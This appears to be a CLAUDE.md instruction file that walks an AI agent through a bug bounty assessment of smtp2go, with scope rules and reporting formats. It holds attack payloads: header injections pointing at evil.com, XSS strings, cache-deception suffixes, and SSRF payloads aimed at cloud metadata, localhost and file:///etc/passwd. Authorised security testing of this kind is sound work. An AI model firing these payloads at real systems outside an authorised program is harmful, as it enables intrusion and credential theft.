# CLAUDE.md — smtp2go Full-Surface Analysis

## ⚠️ Read This First — Skills Available

Before starting ANY phase, read the relevant skill files. They contain canonical
methodology, grep patterns, payload lists, and output formats. Do not skip this.

| Skill | Location | When to read |
|-------|----------|-------------|
| `js-recon` | `/mnt/skills/user/js-recon/SKILL.md` | Before Phase 2 (JS analysis) |
| `web-cache-deception` | `/mnt/skills/user/web-cache-deception/SKILL.md` | Before Phase 4 (WCD/WCP) |
| `web-fingerprint` | `/mnt/skills/user/web-fingerprint/SKILL.md` | Before Phase 1 (fingerprinting) |
| `saml-audit` | `/mnt/skills/user/saml-audit/SKILL.md` | If SSO/SAML endpoints found |

---

## Target Context

**Program**: smtp2go (smtp2go.com / app.smtp2go.com)
**Type**: Email delivery SaaS — transactional/marketing email, multi-tenant with sub-accounts
**Attack classes**: IDOR/BAC · Web Cache Deception · Web Cache Poisoning · postMessage · XSS · SSRF

### Key Object Types (flag every occurrence)

| Object | Priority |
|--------|----------|
| `subaccount_id` | 🔴 CRITICAL — cross-tenant boundary |
| `domain_id` | 🔴 HIGH |
| `sender_id` | 🔴 HIGH |
| `api_key` / `apikey` | 🔴 HIGH — leakage or IDOR |
| `user_id` / `member_id` | 🔴 HIGH |
| `webhook_id` | 🟡 MEDIUM |
| `template_id` | 🟡 MEDIUM |
| `message_id` / `email_id` | 🟡 MEDIUM |
| `report_id` / `campaign_id` | 🟡 MEDIUM |
| `suppression_id` | 🟡 MEDIUM |
| `ip_id` / `dedicated_ip` | 🟡 MEDIUM |

---

## Input Files

```
2026-04-14-213617_csv_requests.csv   ← Primary HTTP traffic — parse this first
original/                             ← Raw JS files, HAR exports, original captures
```

### Parsing the CSV

```python
import pandas as pd
df = pd.read_csv("2026-04-14-213617_csv_requests.csv")
print(df.columns.tolist())   # Inspect column names first — adapt all scripts below
print(df.head(3))            # Verify schema before proceeding
# Common Caido CSV columns: method, path, host, status,
#   request_headers, response_headers, request_body, response_body
```

---

## Output Structure

```
analysis/           ← Brain dumps every ~5 min during active work
│   YYYY-MM-DD-HHMMSS_dump.md
│   ...
│
candidates/         ← Final candidate files (one per attack class)
    idor.md
    wcd.md
    wcp.md
    postmessage.md
    xss.md
    ssrf.md
```

Create on startup:
```bash
mkdir -p analysis candidates
```

---

## ⏱️ Brain Dump Protocol — Every ~5 Minutes

During any active analysis phase, write a brain dump to `analysis/` every ~5 minutes.
Do this proactively without being asked. Even if you found nothing.

### Filename
```bash
analysis/$(date +%Y-%m-%d-%H%M%S)_dump.md
```

### Template

```markdown
# Brain Dump — [TIMESTAMP]
**Phase**: [phase name and specific task]
**Session time**: ~N min

## What I Just Did
[2–5 sentences: exact actions, commands run, files read, patterns grepped]

## What I Found
[Concrete specifics: endpoint names, IDs, header values, JS line numbers]

## What Failed / Dead Ends
[What was tested and produced nothing — negative data is valuable]

## Current Hypothesis
[What looks most promising right now and why]

## Next 5 Minutes
[Specific next action — not vague]

## Open Questions
[Anything ambiguous, needs clarification, or more data to resolve]
```

---

## Phase 1 — Fingerprinting & CSV Triage

> **Read `/mnt/skills/user/web-fingerprint/SKILL.md` before this phase.**

### 1a. Fingerprint from CSV headers

```python
import pandas as pd

df = pd.read_csv("2026-04-14-213617_csv_requests.csv")

# CDN and cache signals
cache_headers = ['CF-Cache-Status','X-Cache','Age','Via','X-Served-By',
                 'Cache-Control','X-Akamai','Fastly-IO','X-Varnish']

# Auth scheme signals
auth_headers = ['Authorization','X-Api-Key','X-Session-Token','X-Account-Id',
                'X-Subaccount-Id','X-Forwarded-For']

# Framework leaks
tech_headers = ['X-Powered-By','Server','X-Runtime','X-Request-Id']

# Extract from response_headers column (adjust column name if needed)
if 'response_headers' in df.columns:
    for hdr in cache_headers + auth_headers + tech_headers:
        hits = df[df['response_headers'].str.contains(hdr, case=False, na=False)]
        if not hits.empty:
            print(f"\n[{hdr}] — {len(hits)} responses")
            print(hits[['method','path',]].drop_duplicates().head(5).to_string())
```

### 1b. Enumerate unique API paths

```python
api_paths = df[df['path'].str.contains('/api/', na=False)]
print(api_paths.groupby(['method','path'])['status'].value_counts().to_string())
```

### 1c. Extract all object IDs from traffic

```python
import re

id_patterns = {
    'subaccount_id': r'subaccount[_-]?id["\s:=]+(\d+)',
    'domain_id':     r'domain[_-]?id["\s:=]+(\d+)',
    'sender_id':     r'sender[_-]?id["\s:=]+(\d+)',
    'api_key':       r'(?:api[_-]?key|apikey)["\s:=]+["\x60]?([A-Za-z0-9_\-]{16,})',
    'webhook_id':    r'webhook[_-]?id["\s:=]+(\d+)',
    'template_id':   r'template[_-]?id["\s:=]+(\d+)',
    'message_id':    r'message[_-]?id["\s:=]+(\d+)',
    'user_id':       r'user[_-]?id["\s:=]+(\d+)',
}

for col in ['request_body','response_body','path']:
    if col not in df.columns:
        continue
    for name, pat in id_patterns.items():
        hits = df[col].dropna().str.extractall(pat)
        if not hits.empty:
            print(f"\n[{name}] in {col}: {len(hits)} hits")
            print(hits.head(5))
```

---

## Phase 2 — JS Analysis

> **Read `/mnt/skills/user/js-recon/SKILL.md` before this phase.**
> Check `original/` for JS files before crawling live.

```bash
ls original/
# If JS files are present, run patterns directly against them.
# Set JS_DIR accordingly.
```

### smtp2go-specific grep patterns

```bash
JS_DIR="original"

# Sub-account boundary — top priority
grep -rn -E '(subaccount|sub_account|subAccount)[_-]?id' "$JS_DIR"

# Admin / impersonation / account switching
grep -rn -E '(admin|impersonat|switch.?account|act.?as|masquerade)' "$JS_DIR"

# postMessage usage — feeds Phase 5
grep -rn -E '(postMessage|addEventListener.*message|window\.(parent|top|opener))' "$JS_DIR"

# SSRF-interesting URL parameters
grep -rn -E '["x60](url|webhook|callback|redirect|fetch|proxy|endpoint)["\x60]\s*[:]\s*' "$JS_DIR"

# XSS sinks
grep -rn -E '(innerHTML|outerHTML|document\.write|insertAdjacentHTML|\.html\s*\()' "$JS_DIR"

# URL reflection — XSS via URL params
grep -rn -E '(location\.search|location\.hash|URLSearchParams|params\.get)' "$JS_DIR"

# API key / auth header construction
grep -rn -E '(Authorization|X-Api-Key|api[_-]?key)\s*[:+]\s*["\x60]' "$JS_DIR"

# Hardcoded secrets
grep -rn -E '(sk_live|pk_live|secret|password)\s*[:=]\s*["\x60][A-Za-z0-9_\-]{16,}' "$JS_DIR"
```

Document all endpoints in `candidates/idor.md`, flagging IDs in path/body.

---

## Phase 3 — IDOR / BAC Candidates

**Output → `candidates/idor.md`**

### smtp2go BAC test matrix

| Endpoint pattern | Test: Account A → Account B's object |
|-----------------|--------------------------------------|
| `*/subaccounts/{id}*` | Read/write B's subaccount — CRITICAL |
| `*/domains/{id}` | Verify, delete, read B's domain |
| `*/senders/{id}` | CRUD on B's sender address |
| `*/webhooks/{id}` | Read B's webhook URL/secret |
| `*/api-keys/{id}` | List/revoke B's API keys |
| `*/templates/{id}` | Read/modify B's templates |
| `*/reports/*` | Read B's delivery stats and message data |
| `*/suppressions/{id}` | Add/remove B's suppressions |
| `*/members/{id}` | Add yourself to B's team |
| `*/dedicated-ips/{id}` | Reassign B's dedicated IP |

### Candidate entry format

```markdown
## [IDOR-001] DELETE /api/v1/domains/{domain_id}

| Field | Value |
|---|---|
| **Source** | CSV row 47 |
| **Method** | DELETE |
| **Object type** | domain_id — integer |
| **Severity estimate** | High |
| **Test status** | ⬜ Untested |

### Test plan
- [ ] Account B owns domain_id=882 — DELETE from Account A session
- [ ] domain_id ± 1, ± 10 from your own
- [ ] domain_id=0, -1, null, "admin"
- [ ] Param pollution: ?domain_id=MINE&domain_id=TARGET
- [ ] Method swap: PUT/PATCH to same path

### Result
_Populate after testing._
```

---

## Phase 4 — Web Cache Deception & Web Cache Poisoning

> **Read `/mnt/skills/user/web-cache-deception/SKILL.md` before this phase.**

### 4a. WCD — triage from CSV

```python
# GET requests returning sensitive data
sensitive = ['email','api_key','token','account','billing',
             'sender','domain','webhook','member','password']

gets = df[df['method'] == 'GET']
for kw in sensitive:
    hits = gets[gets.get('response_body', pd.Series()).str.contains(kw, case=False, na=False)]
    if not hits.empty:
        print(f"\n[WCD candidate — '{kw}'] {len(hits)} requests")
        print(hits[['path','status']].drop_duplicates().to_string())
```

Check each candidate: does `Cache-Control: private/no-store` appear? If not or if
CDN headers are present, it's a live WCD surface.

### 4b. WCD suffix payloads

```
/api/v1/account/profile/x.css
/api/v1/account/profile/x.js
/api/v1/account/profile/x.png
/api/v1/account/profile/x.woff2
/api/v1/account/profile;.css
/api/v1/account/profile%23.css
/api/v1/account/profile%3f.css
```

Full suffix list: see `web-cache-deception` skill → `references/suffixes.txt`

### 4c. Web Cache Poisoning — unkeyed input

**Goal**: Find response content that reflects request headers/params not in the cache key.

```python
# Find paths where response body or Location header may echo request header values
# Look for: Host, X-Forwarded-Host, X-Forwarded-For reflected in body or redirect
```

Inject these headers and check if reflected:
```http
X-Forwarded-Host: evil.com
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Host: evil.com
X-Rewrite-URL: /api/v1/admin
```

Flag if reflected in: `Location:`, `Content-Location:`, body HTML (`href`, `src`, `action`),
or JSON values (e.g. `"redirect_url": "https://evil.com/..."`).

**Output → `candidates/wcd.md`** and **`candidates/wcp.md`**

```markdown
## [WCD-001] GET /api/v1/account/settings

| Field | Value |
|---|---|
| **CDN detected** | Cloudflare (CF-Cache-Status in headers) |
| **Sensitive data in response** | api_key, email, webhook_url |
| **Cache-Control (base path)** | private, no-cache |
| **Suffix tested** | ⬜ Not yet |
| **CF-Cache-Status on suffix** | ⬜ Not yet |
| **Unauth result** | ⬜ Not yet |
| **Test status** | ⬜ Untested |
```

---

## Phase 5 — postMessage Candidates

**Output → `candidates/postmessage.md`**

### Find in JS

```bash
grep -rn -E 'postMessage|addEventListener.*["\x27]message["\x27]|window\.(parent|top|opener)' original/
```

### For each usage, document

```markdown
## [PM-001] iframe → parent in embed.js:1842

| Field | Value |
|---|---|
| **Source** | original/embed.chunk.js:1842 |
| **Direction** | child → parent |
| **Origin check** | ❌ None — event.origin not validated |
| **Data sent** | `{ type: "auth_token", token: userToken }` |
| **Receiver action** | Parent sets auth cookie from received token |
| **Attack scenario** | Rogue page embeds iframe, receives token via postMessage |
| **Severity estimate** | High |
| **Test status** | ⬜ Untested |
```

### Vulnerable patterns to flag

| Pattern | Risk |
|---------|------|
| `postMessage(data, '*')` | Any origin receives the data |
| `addEventListener('message', fn)` with no origin check | DOM XSS / token theft |
| `window.opener.postMessage(...)` | Tabnapping + data exfil |
| `eval(event.data)` or `innerHTML = event.data` | Direct XSS via postMessage |
| Auth token/API key in message payload | Credential theft if origin unchecked |

---

## Phase 6 — XSS Candidates

**Output → `candidates/xss.md`**

### Reflected parameter detection from CSV

```python
import urllib.parse

for _, row in df.iterrows():
    path = str(row.get('path',''))
    body = str(row.get('response_body',''))
    if '?' not in path or not body:
        continue
    qs = urllib.parse.parse_qs(urllib.parse.urlparse(path).query)
    for k, vals in qs.items():
        for v in vals:
            if len(v) > 3 and v in body:
                print(f"[REFLECT] {path} — param '{k}'='{v}' found in response body")
```

### smtp2go XSS surface

| Surface | Attack type |
|---------|------------|
| Sender name / email display | Stored XSS — rendered in dashboard |
| Domain name fields | Stored XSS |
| Webhook URL field | Stored — reflected back in settings UI |
| Error messages echoing input | Reflected XSS |
| CSV import name fields | Stored XSS via bulk import |
| `redirect_to` / `next` params | Open redirect → `javascript:` XSS |
| Email tracking params (`?tag=`, `?name=`) | Reflected if rendered in stats UI |

### Candidate entry format

```markdown
## [XSS-001] Stored — Sender Name Field

| Field | Value |
|---|---|
| **Source** | POST /api/v1/senders — name field |
| **Type** | Stored |
| **Sink** | Dashboard sender list — rendered in DOM |
| **Payload** | `<script>alert(document.domain)</script>` |
| **Severity estimate** | Medium–High |
| **Test status** | ⬜ Untested |

### Test plan
- [ ] Create sender with name: `<script>alert(1)</script>`
- [ ] View sender list — does it fire?
- [ ] Try attribute injection: `" onmouseover="alert(1)`
- [ ] Try CSP bypass if basic blocked

### Result
_Populate after testing._
```

---

## Phase 7 — SSRF Candidates

**Output → `candidates/ssrf.md`**

smtp2go makes outbound HTTP requests by design (webhooks, domain verification,
tracking). This is one of the richest SSRF surfaces on this target.

### SSRF surface map

| Feature | Vector |
|---------|--------|
| Webhook URL config | `POST /api/v1/webhooks { "url": "http://169.254.169.254/..." }` |
| "Test webhook" button | Explicit server fetch — try SSRF payloads directly |
| Domain verification (HTTP method) | Server fetches a URL on your domain — try redirect to internal |
| Email tracking pixel | If server-side fetch, redirect chain → internal |
| "Import list from URL" | Any fetch-from-URL feature |
| Image embed / preview | If server fetches image URLs from message content |

### Extract URL fields from CSV

```python
import re

url_params = ['url','webhook','callback','redirect','endpoint','fetch','proxy','dest','target']

for col in ['request_body','path']:
    if col not in df.columns:
        continue
    for param in url_params:
        pattern = rf'["\']?{re.escape(param)}["\']?\s*[:=]\s*["\']?(https?://[^\s"\'&\]}}]+)'
        hits = df[col].dropna().str.extractall(pattern, flags=re.IGNORECASE)
        if not hits.empty:
            print(f"\n[SSRF surface — '{param}' in {col}]")
            print(hits.head(10))
```

### SSRF test payloads

```
# Cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/?recursive=true
http://169.254.170.2/v2/credentials/  (AWS ECS)

# Internal probe
http://localhost/
http://127.0.0.1:8080/
http://10.0.0.1/
http://192.168.1.1/

# Protocol smuggling
dict://127.0.0.1:6379/
ftp://127.0.0.1:21/
file:///etc/passwd

# Blind (use interactsh or Burp Collaborator)
http://YOUR-INTERACTSH-URL/ssrf-smtp2go-webhook
```

### Candidate entry format

```markdown
## [SSRF-001] Webhook URL — POST /api/v1/webhooks

| Field | Value |
|---|---|
| **Source** | CSV row 089 |
| **Parameter** | url in POST body |
| **Server-side fetch confirmed** | ⬜ Need interactsh ping |
| **Redirect follow** | ⬜ Unknown |
| **Internal access** | ⬜ Unknown |
| **Severity estimate** | High if metadata confirmed |
| **Test status** | ⬜ Untested |

### Test plan
- [ ] Set url to interactsh endpoint — does server call it? (blind SSRF)
- [ ] Set url to http://169.254.169.254/latest/meta-data/
- [ ] Set url to http://localhost:8080/
- [ ] Redirect chain: your server 301 → internal target

### Result
_Populate after testing._
```

---

## Candidate Status Values

Used in every candidate file:

| Status | Meaning |
|--------|---------|
| ⬜ Untested | Not yet tested |
| 🔄 In Progress | Currently testing |
| ✅ Confirmed | Exploitable — write full repro immediately, stop further exploitation |
| ❌ Not Vulnerable | Tested, not exploitable — document what was tried |
| 🔄 Partial | Inconclusive — document what is unknown |

---

## Rules

- **Read the skills before each phase** — do not rely on memory or guess patterns.
- Confirm smtp2go is in scope and review program policy before any non-read test.
- Two test accounts required for all IDOR testing (Account A and Account B).
- Never send real email to third-party addresses during testing — use your own domains.
- Write a brain dump to `analysis/` every ~5 minutes of active work without being asked.
- Append to candidate files — never overwrite or truncate existing entries.
- Negative results must be documented — they matter as much as positives.
- On ✅ Confirmed: stop further exploitation, draft report immediately.
- Do not enumerate object IDs beyond ±500 of your own observed range.
